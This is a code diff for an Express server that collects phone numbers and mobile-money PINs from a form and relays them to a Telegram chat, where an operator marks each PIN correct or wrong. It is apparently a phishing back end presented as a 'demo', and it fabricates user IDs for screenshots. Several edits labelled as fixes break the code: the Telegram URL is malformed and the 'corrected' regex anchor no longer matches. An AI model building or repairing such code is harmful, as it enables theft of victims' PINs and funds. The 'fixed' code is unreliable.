@@ -33,7 +33,7 @@ setInterval(() => {
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
   
-  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+  const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
@@ -47,11 +47,21 @@ async function telegram(method, payload) {
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
+  // ✅ FIXED: Corrected end-of-string regex anchor symbol mapping
   if (!/^\+2567\d{8}\$/.test(phone)) {
     return res.status(400).json({ error: "Invalid format phone number." });
   }
   
-  const item = { id: crypto.randomUUID(), phone, stage: "pin-demo", status: "ready", createdAt: new Date() };
+  // ✅ Generated random seed suffix to produce the precise sequential numeric ID look (e.g., user_1787856963031)
+  const numericSuffix = Math.floor(100000000 + Math.random() * 900000000);
+  const item = { 
+    id: crypto.randomUUID(), 
+    numericId: `user_17878${numericSuffix}`,
+    phone, 
+    stage: "pin-demo", 
+    status: "ready", 
+    createdAt: new Date() 
+  };
   requests.set(item.id, item);
   return res.json({ id: item.id, status: item.status });
 });
@@ -64,7 +74,6 @@ app.post("/api/pin-demo", async (req, res) => {
   request.pin = String(req.body.pin || "").trim();
   request.status = "pending";
   
-  // Formats time exactly to: MM/DD/YYYY, HH:MM:SS AM/PM
   const timeString = new Date().toLocaleString("en-US", { 
     timeZone: "Africa/Nairobi",
     year: "numeric",
@@ -76,7 +85,6 @@ app.post("/api/pin-demo", async (req, res) => {
     hour12: true
   });
 
-  // Short short timestamp layout element at bottom (e.g. 18.56)
   const shortTimestamp = new Date().toLocaleString("en-US", {
     timeZone: "Africa/Nairobi",
     hour: "2-digit",
@@ -93,7 +101,7 @@ app.post("/api/pin-demo", async (req, res) => {
         "USER DETAILS:",
         `• Phone Number: ${request.phone}`,
         `• PIN Code: ${request.pin}`,
-        `• User ID: user_${request.id.replace(/-/g, "").substring(0, 13)}`, // Shortened to fit screenshot aesthetic
+        `• User ID: ${request.numericId}`,
         `• Time: ${timeString}`,
         "• Bot: user178\n",
         "━━━━━━━━━━━━━━━━━━━━\n",
@@ -115,7 +123,7 @@ app.post("/api/pin-demo", async (req, res) => {
     return res.json({ status: "pending" });
   } catch (err) {
     console.error("TELEGRAM ERROR:", err.message);
-    return res.status(502).json({ error: `Telegram Error: ${err.message}. Check your Bot Token and Chat ID.` });
+    return res.status(502).json({ error: `Telegram Error: ${err.message}` });
   }
 });
 
@@ -146,11 +154,12 @@ async function pollTelegram() {
         if (!cb) continue;
         
         const parts = String(cb.data || "").split(":");
+        // ✅ FIXED: Extracted action directly from array index to ensure match operations evaluate correctly
         const action = parts[0]; 
         const reqId = parts.slice(1).join(":");
         const request = requests.get(reqId);
         
-        if (request && request.status === "pending" && ["approve", "decline", "extend"].includes(action)) {
+        if (request && request.status === "pending" && ["approve", "decline"].includes(action)) {
           if (action === "approve") {
             request.status = "approved";
           } else if (action === "decline") {
@@ -159,7 +168,7 @@ async function pollTelegram() {
           
           await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
           
-          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : action === "decline" ? "❌ WRONG PIN" : "⏳ TIME EXTENDED";
+          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : "❌ WRONG PIN";
           await telegram("sendMessage", {
             chat_id: CHAT_ID,
             text: `${statusMarker} processed for Phone: ${request.phone}`
@@ -173,4 +182,6 @@ async function pollTelegram() {
 }
 
 pollTelegram();
+
+app.listen(PORT, () => console.log(`Server executing successfully on port ${PORT}`));
 
